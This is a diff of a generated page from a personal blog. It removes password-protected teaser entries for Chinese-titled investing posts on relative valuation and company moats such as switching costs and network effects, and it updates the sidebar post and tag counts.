-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/组合实践1-相对估值法+三档建仓/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Klaus">
-      <meta itemprop="description" content="Tough time don't last, tough people do.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Klaus' Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/01/组合实践1-相对估值法+三档建仓/" class="post-title-link" itemprop="url">组合实践--（1）相对估值法+三档建仓</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-05-01 16:33:35 / Modified: 17:04:06" itemprop="dateCreated datePublished" datetime="2019-05-01T16:33:35+08:00">2019-05-01</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          Welcome to my blog, enter password to read.
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/05/01/组合实践1-相对估值法+三档建仓/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/公司分析6-实例分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Klaus">
-      <meta itemprop="description" content="Tough time don't last, tough people do.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Klaus' Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/01/公司分析6-实例分析/" class="post-title-link" itemprop="url">公司分析--（6）实例分析</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-05-01 14:40:14 / Modified: 17:04:33" itemprop="dateCreated datePublished" datetime="2019-05-01T14:40:14+08:00">2019-05-01</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          Welcome to my blog, enter password to read.
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/05/01/公司分析6-实例分析/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/公司分析5-成本优势+规模效应/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Klaus">
-      <meta itemprop="description" content="Tough time don't last, tough people do.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Klaus' Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/01/公司分析5-成本优势+规模效应/" class="post-title-link" itemprop="url">公司分析--（5）成本优势+规模效应</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-05-01 12:39:34 / Modified: 17:04:44" itemprop="dateCreated datePublished" datetime="2019-05-01T12:39:34+08:00">2019-05-01</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          Welcome to my blog, enter password to read.
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/05/01/公司分析5-成本优势+规模效应/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/公司分析4-网络效应/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Klaus">
-      <meta itemprop="description" content="Tough time don't last, tough people do.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Klaus' Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/01/公司分析4-网络效应/" class="post-title-link" itemprop="url">公司分析--（4）网络效应</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-05-01 11:17:34 / Modified: 17:04:59" itemprop="dateCreated datePublished" datetime="2019-05-01T11:17:34+08:00">2019-05-01</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          Welcome to my blog, enter password to read.
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/05/01/公司分析4-网络效应/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/公司分析3-转换成本/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Klaus">
-      <meta itemprop="description" content="Tough time don't last, tough people do.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Klaus' Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/01/公司分析3-转换成本/" class="post-title-link" itemprop="url">公司分析--（3）转换成本</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-05-01 10:43:34 / Modified: 17:05:06" itemprop="dateCreated datePublished" datetime="2019-05-01T10:43:34+08:00">2019-05-01</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          Welcome to my blog, enter password to read.
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/05/01/公司分析3-转换成本/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1923,7 +1952,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">21</span>
+                    <span class="site-state-item-count">28</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -1958,7 +1987,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">8</span>
+                      
+                    
+                    <span class="site-state-item-count">9</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
